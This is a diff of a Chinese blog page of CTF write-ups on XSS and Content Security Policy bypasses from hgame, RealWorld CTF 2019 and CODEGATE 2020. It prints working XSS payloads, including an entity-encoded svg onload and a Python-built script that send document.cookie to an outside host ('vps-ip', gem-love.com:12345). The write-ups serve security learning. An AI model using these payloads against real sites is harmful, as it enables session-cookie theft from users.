@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head><meta name="generator" content="Hexo 3.9.0">
+  <head>
     
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
-  <meta name="description" content="XSS&bypass CSP">
+  <meta name="description" content="XSS&bypass CSP"/>
 
 
 
 
-  <meta name="keywords" content="xss,">
+  <meta name="keywords" content="xss," />
 
 
 
@@ -28,33 +28,34 @@
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
 
 
 
-<link rel="canonical" href="https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/">
+<link rel="canonical" href="https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/"/>
 
 
 <meta name="description" content="从几道题学习XSS以及一些相关绕过姿势">
-<meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS&amp;bypass CSP">
 <meta property="og:url" content="https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/index.html">
 <meta property="og:site_name" content="glotozz&#39;blog">
 <meta property="og:description" content="从几道题学习XSS以及一些相关绕过姿势">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/02/27/93cUXqHORnm5xwv.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/02/27/KIdhCn8NF4uSGU7.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/27/6E5zqaNeoQOD8m1.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/27/mH7sSqa32MnTgQk.png">
-<meta property="og:updated_time" content="2020-02-27T08:12:33.249Z">
+<meta property="article:published_time" content="2020-02-27T02:01:25.000Z">
+<meta property="article:modified_time" content="2020-02-27T10:55:56.533Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS&amp;bypass CSP">
-<meta name="twitter:description" content="从几道题学习XSS以及一些相关绕过姿势">
-<meta name="twitter:image" content="https://i.loli.net/2020/02/27/KIdhCn8NF4uSGU7.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/27/93cUXqHORnm5xwv.jpg">
 
 
-<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
-<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
 
 
 
@@ -76,7 +77,7 @@
 
 
     <title> XSS&bypass CSP - glotozz'blog </title>
-  </head>
+  <meta name="generator" content="Hexo 4.2.0"></head>
 
   <body>
     <div id="page">
@@ -147,11 +148,29 @@
 <meta name="referrer" content="no-referrer">
 <a id="more"></a>
 
-<h4 id="hgame-Cosmos的聊天室1"><a href="#hgame-Cosmos的聊天室1" class="headerlink" title="hgame-Cosmos的聊天室1"></a>hgame-Cosmos的聊天室1</h4><p>环境关了，yy一下好了==！</p>
+<hr>
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#hgame-cosmos的聊天室1">hgame-Cosmos的聊天室1</a></li>
+<li><a href="#hgame-comcos聊天室2">hgame-Comcos聊天室2</a></li>
+<li><a href="#realworld-ctf2019-mission-invisible">RealWorld CTF2019-Mission Invisible</a></li>
+<li><a href="#realworld-ctf2019-hcorme">RealWorld CTF2019-Hcorme</a></li>
+<li><a href="#codegate-2020-csp绕过">CODEGATE 2020 CSP绕过</a></li>
+<li><a href="#0ctf2018-h4xorsclub2">0ctf2018-h4xors.club2</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<img src="https://i.loli.net/2020/02/27/93cUXqHORnm5xwv.jpg" alt="v2-0da70f6ff8421f5c72412b4a70996bd8_720w.jpg" style="zoom:67%;">
+
+<h4><span id="hgame-cosmos的聊天室1">hgame-Cosmos的聊天室1</span></h4><p>环境关了，只能yy一下了==！</p>
 <p>过滤了所有闭合标签script、iframe等：<code>re.sub(&quot;&lt;\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message)</code>,并转化为大写</p>
 <p>用浏览器事件执行js，不闭合右标签时会自动补全</p>
 <p>payload1</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span><br><span class="line">&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;</span><br><span class="line">#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span><br><span class="line">&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;</span><br><span class="line">#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47</span><br></pre></td></tr></table></figure>
 
 <p>编码内容<code>window.open(&#39;http://vps-ip&#39;+document.cookie);//</code></p>
 <p>payload2</p>
@@ -166,33 +185,33 @@
 <img src="https://i.loli.net/2020/02/27/KIdhCn8NF4uSGU7.png" alt="Snipaste_2020-02-27_12-56-43.png" style="zoom:67%;">
 
 <hr>
-<h4 id="hgame-Comcos聊天室2"><a href="#hgame-Comcos聊天室2" class="headerlink" title="hgame-Comcos聊天室2"></a>hgame-Comcos聊天室2</h4><p>将<code>script</code>替换为空，双写绕过，但是出现报错</p>
+<h4><span id="hgame-comcos聊天室2">hgame-Comcos聊天室2</span></h4><p>将<code>script</code>替换为空，双写绕过，但是出现报错</p>
 <blockquote>
 <p>Refused to execute inline script because it violates the following Content<br>Security Policy directive: “script-src ‘self’”. Either the ‘unsafe-inline’<br>keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or a<br>nonce (‘nonce-…’) is required to enable inline execution.</p>
 </blockquote>
 <p>查看CSP策略</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种<br>CSP ⼀般是找该站是否有文件上传点，上传⼀个内容为 <code>alert(/xss/)</code> 的图⽚再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。</p>
 </blockquote>
 <p>本题中有⼀个接口 <code>/send</code>，它会返回过滤后的消息内容，我们可以利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src=&quot;/send?message=alert(1)&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;alert(1)&quot;&gt;&lt;&#x2F;scscriptript&gt;</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="RealWorld-CTF2019-Mission-Invisible"><a href="#RealWorld-CTF2019-Mission-Invisible" class="headerlink" title="RealWorld CTF2019-Mission Invisible"></a>RealWorld CTF2019-Mission Invisible</h4><p>给了源码，核心是</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    function setElement(tag) &#123;</span><br><span class="line">        tag = tag.substring(0, 1);</span><br><span class="line">        var ele = document.createElement(tag)</span><br><span class="line">        var attrs = getCookie("attrs").split("&amp;");</span><br><span class="line">        for (var i = 0; i &lt; attrs.length; i++) &#123;</span><br><span class="line">            var key = attrs[i].split("=")[0];</span><br><span class="line">            var value = attrs[i].split("=")[1];</span><br><span class="line">            ele.setAttribute(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        document.body.appendChild(ele);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var tag = getUrlParam("tag");</span><br><span class="line">    setCookie("tag", tag);</span><br><span class="line">    setElement(tag);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4><span id="realworld-ctf2019-mission-invisible">RealWorld CTF2019-Mission Invisible</span></h4><p>给了源码，核心是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">setElement</span><span class="params">(tag)</span> </span>&#123;</span></span><br><span class="line">        tag = tag.substring(0, 1);</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ele = <span class="built_in">document</span>.createElement(tag)</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> attrs = getCookie(<span class="string">"attrs"</span>).split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; attrs.length; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> key = attrs[i].split(<span class="string">"="</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> value = attrs[i].split(<span class="string">"="</span>)[<span class="number">1</span>];</span></span><br><span class="line">            ele.setAttribute(key, value);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(ele);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> tag = getUrlParam(<span class="string">"tag"</span>);</span></span><br><span class="line"><span class="actionscript">    setCookie(<span class="string">"tag"</span>, tag);</span></span><br><span class="line">    setElement(tag);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>可以构造一个标签并为其设置属性</p>
 <p>只能使用<code>a、p</code>，但是需要使其自动触发，解决办法如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
 
 <p>chrome测试成功</p>
 <img src="https://i.loli.net/2020/02/27/6E5zqaNeoQOD8m1.png" alt="Snipaste_2020-02-27_14-19-15.png" style="zoom:67%;">
 
 <p>之后常规打cookie即可</p>
 <hr>
-<h4 id="RealWorld-CTF2019-Hcorme"><a href="#RealWorld-CTF2019-Hcorme" class="headerlink" title="RealWorld CTF2019-Hcorme"></a>RealWorld CTF2019-Hcorme</h4><blockquote>
+<h4><span id="realworld-ctf2019-hcorme">RealWorld CTF2019-Hcorme</span></h4><blockquote>
 <p>题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。 </p>
 </blockquote>
 <p>两个限制：<code>XSS Auditor</code>、<code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
@@ -207,10 +226,10 @@
 <p>绕过CSP，是利用JSONP直接把js代码挂载到本地的<code>script</code></p>
 <p>会进行两次资源请求，第二次的资源类型是<code>script</code></p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(quote((&apos;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&apos;).encode(&apos;utf-16&apos;)))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(quote((&#39;&lt;script&#x2F;src&#x3D;?callback&#x3D;alert(1)&gt;&lt;&#x2F;script&gt;&#39;).encode(&#39;utf-16&#39;)))</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="CODEGATE-2020-CSP绕过"><a href="#CODEGATE-2020-CSP绕过" class="headerlink" title="CODEGATE 2020 CSP绕过"></a>CODEGATE 2020 CSP绕过</h4><p>前面是一个简单的正则绕过，发现存在CSP</p>
+<h4><span id="codegate-2020-csp绕过">CODEGATE 2020 CSP绕过</span></h4><p>前面是一个简单的正则绕过，发现存在CSP</p>
 <p><code>script-src &#39;none&#39;</code></p>
 <p><code>view.php</code>提交到<code>api.php</code>，格式为name/p1/p2，可以设置<strong>header</strong></p>
 <p>解决办法：*<em>http状态码置为102时，CSP不会执行 *</em></p>
@@ -218,14 +237,14 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: 颖奇L'Amore</span></span><br><span class="line"><span class="comment">#www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">csp1 = str(base64.b64encode(<span class="string">b'header'</span>) ,encoding = <span class="string">"utf8"</span>)</span><br><span class="line">csp2 = str(base64.b64encode(<span class="string">b'HTTP/1.1'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">csp3 = str(base64.b64encode(<span class="string">b'102'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">name = str(base64.b64encode(<span class="string">b'body'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">xss = str(base64.b64encode(<span class="string">b'&lt;script\n&gt;window.open("http://gem-love.com:12345/?"+document.cookie);&lt;/script\n&gt;'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">p3 = <span class="string">"MQ=="</span> <span class="comment">#p3 is useless</span></span><br><span class="line">print(<span class="string">'|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'</span>.format(csp1,csp2,csp3,name,xss,p3))</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="0ctf2018-h4xors-club2"><a href="#0ctf2018-h4xors-club2" class="headerlink" title="0ctf2018-h4xors.club2"></a>0ctf2018-h4xors.club2</h4><p>发现看不懂==！以后再来补</p>
+<h4><span id="0ctf2018-h4xorsclub2">0ctf2018-h4xors.club2</span></h4><p>发现看不懂==！以后再来补</p>
 <hr>
 <p>最后给个分享个链接，遇到问题可以查一查：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a></p>
 <hr>
-<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p> <a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a> </p>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a> </p>
 <p> <a href="https://github.com/vidar-team/Hgame2020_writeup/" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup/</a> </p>
 <p> <a href="https://www.gem-love.com/ctf/1329.html#CSP" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1329.html#CSP</a> </p>
-<p> <a href="http://www.wupco.cn/?p=4408" target="_blank" rel="noopener">http://www.wupco.cn/?p=4408</a> </p>
+<p> <a href="http://www.wupco.cn/?p=4408" target="_blank" rel="noopener">http://www.wupco.cn/?p=4408</a></p>
 
             </div>
           
@@ -262,7 +281,7 @@
   <nav class="post-nav">
     
     
-      <a class="next" href="/2020/02/26/从一道题学习bypass-disable-func/">
+      <a class="next" href="/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/">
         <span class="next-text nav-default">从一道题学习bypass disable_func</span>
         <span class="prev-text nav-mobile">Next</span>
         <i class="iconfont icon-right"></i>
@@ -286,16 +305,22 @@
 
       </div>
 
-      <footer id="colophon"><span class="copyright-year">
+      <footer id="colophon"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span class="copyright-year">
     
         &copy;
     
     2020
     <span class="footer-author">glotozz.</span>
     <span class="power-by">
-        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
     </span>
 </span>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访问量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
 
       </footer>
 
